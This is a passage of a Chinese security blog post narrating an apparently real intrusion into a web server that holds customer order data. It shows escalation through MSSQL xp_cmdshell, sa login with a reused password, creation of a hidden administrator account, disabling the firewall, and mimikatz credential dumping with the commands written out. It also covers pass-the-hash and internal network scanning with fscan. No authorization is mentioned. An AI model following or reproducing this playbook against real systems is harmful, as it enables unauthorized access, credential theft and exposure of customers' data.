+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201620094.png" alt="image-20230420201620094"></p>
+<p>还有很多订单信息</p>
+<p>虽然我知道没有sa的权限，但是还是抱着试一试的态度,想试试MSSQL xp_cmdshell提权漏洞</p>
+<p><code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;</code></p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201317706.png" alt="image-20230420201317706"></p>
+<p>开启了xp_cmdshell</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201359026.png" alt="image-20230420201359026"></p>
+<p>执行却失败了。唉。</p>
+<p>我超，但是我尝试使用这个用户的密码登录sa账户，居然成功了！</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202053653.png" alt="image-20230420202053653"></p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202124643.png" alt="image-20230420202124643"></p>
+<p>打开xp_cmdshell</p>
+<p><code>exec master..xp_cmdshell &#39;whoami&#39;</code></p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202329456.png" alt="image-20230420202329456"></p>
+<p>成功来到sqlserver权限</p>
+<h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202646252.png" alt="image-20230420202646252"></p>
+<p>添加用户</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202708880.png" alt="image-20230420202708880"></p>
+<p>加到管理组去</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420203129525.png" alt="image-20230420203129525"></p>
+<p>成功添加到管理组了！！</p>
+<p>远程桌面链接成功！</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420203150864.png" alt="image-20230420203150864"></p>
+<p>然后手动关掉防火墙</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420204036644.png" alt="image-20230420204036644"></p>
+<p>传猕猴桃上去抓一下密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420204610088.png" alt="image-20230420204610088"></p>
+<p>准备hash传递登录administrator账户</p>
+<p>传递没成功，不过无所谓了。反正我们创建的账户已经有管理员权限了。</p>
+<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用netspy看看存活网断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netspy.exe -x is //极速模式</span><br></pre></td></tr></table></figure>
+
+<p>发现竟然没有扫描到存活网段，也是，毕竟是云上的服务器。那就arp -a.</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420210326953.png" alt="image-20230420210326953"></p>
+<p>判断出存在b段172.29，上fscan一把嗦</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 172.29.x.x -h 172.29.1.1/16</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420210648416.png" alt="image-20230420210648416"></p>
+<p>结果也只扫到了自己捏。估计是真的没什么东西吧</p>
+<p>后面又重新hash传递了一下，换了个方法传递成功之后，准备上管理员的机器看看有没有什么运维本什么的。</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420213038176.png" alt="image-20230420213038176"></p>
+<p>随后登录我们刚刚创建的管理员账号上去，关掉这个策略限制</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420213258547.png" alt="image-20230420213258547"></p>
+<p>给他改成禁用。</p>
+<p>但是需要administrator注销重新登录才可以，我又不能直接重启，我怕把他web服务给整掉了</p>
+<p>确实也只有一台服务器</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420215042417.png" alt="image-20230420215042417"></p>
+<p>暂时点到为止吧</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/wan1/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/" rel="prev" title="pc端微信个人信息与聊天记录取证">
+      <i class="fa fa-chevron-left"></i> pc端微信个人信息与聊天记录取证
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/wan1/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" rel="next" title="java反序列化基础">
+      java反序列化基础 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F"><span class="nav-number">1.</span> <span class="nav-text">【实战】UEditor.net rce的一次渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shell"><span class="nav-number">2.</span> <span class="nav-text">shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.1.</span> <span class="nav-text">数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="nav-number">3.2.</span> <span class="nav-text">远程桌面</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91"><span class="nav-number">4.</span> <span class="nav-text">内网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="十三"
+      src="/wan1/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">十三</p>
+  <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/wan1/archives/">
+        
+          <span class="site-state-item-count">172</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">十三</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/wan1/lib/anime.min.js"></script>
+  <script src="/wan1/lib/velocity/velocity.min.js"></script>
+  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/wan1/js/utils.js"></script>
+
+<script src="/wan1/js/motion.js"></script>
+
+
+<script src="/wan1/js/schemes/pisces.js"></script>
+
+
+<script src="/wan1/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/wan1/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
